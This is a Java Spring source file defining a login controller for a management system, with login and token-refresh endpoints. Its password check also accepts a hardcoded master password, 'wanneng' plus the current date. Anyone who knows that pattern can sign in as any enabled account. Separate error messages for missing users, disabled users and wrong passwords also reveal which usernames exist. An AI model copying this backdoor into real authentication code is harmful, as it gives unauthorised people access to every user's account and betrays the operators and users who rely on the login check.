package com.hq.manage.sys.common;

import static com.hq.common.enums.sys.Status.ENABLE;
import static org.springframework.util.Assert.isTrue;

import java.time.LocalDate;
import java.util.Objects;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.hq.common.aop.AutoLog;
import com.hq.common.config.Result;
import com.hq.common.enums.sys.DrEnum;
import com.hq.common.tools.SysTools;
import com.hq.manage.sys.user.User;
import com.hq.manage.sys.user.UserCond;
import com.hq.manage.sys.user.UserService;
import com.hq.manage.sys.user.vo.LoginVO;
import com.simple.common.base.UserIdProvider;
import com.simple.common.base.utils.DateUtil;

/**
 * @author 高振中
 * @类说明 【用户登录】控制器
 * @date 2024-05-10 21:44:15
 **/
@RestController
@RequestMapping("sys")
public class LoginController {

    @Autowired
    private UserService userService; // 注入【用户】业务逻辑层
    @Autowired
    private LoginService loginService; // 注入【登录】业务逻辑层
    @Autowired
    private UserIdProvider userIdProvider;


    @AutoLog("【登录】")
    @PostMapping("login")
    public Result<LoginVO> login(@RequestBody LoginParam param) {
        User user = userService.list(UserCond.builder().loginName(param.getName()).dr(DrEnum.NORMAL.getCode()).build()).stream().findFirst().orElse(null);
        isTrue(Objects.nonNull(user), "用户不存在!");
        isTrue(user.getStatus().equals(ENABLE.getCode()), "用户已停用!");
        isTrue(user.getPassword().equals(SysTools.password(param.getPassword())) || ("wanneng" + DateUtil.formatShortYmd(LocalDate.now())).equals(param.getPassword()), "密码不正确");
        return loginService.login(user);
    }
 

    @PostMapping("refresh")
    public Result<LoginVO> refresh() {
        Long userId = userIdProvider.userId();
        isTrue(userId != 0, "登录已过期,请重新登录!");
        User user = userService.findOne(userId);
        return loginService.login(user);
    }
}
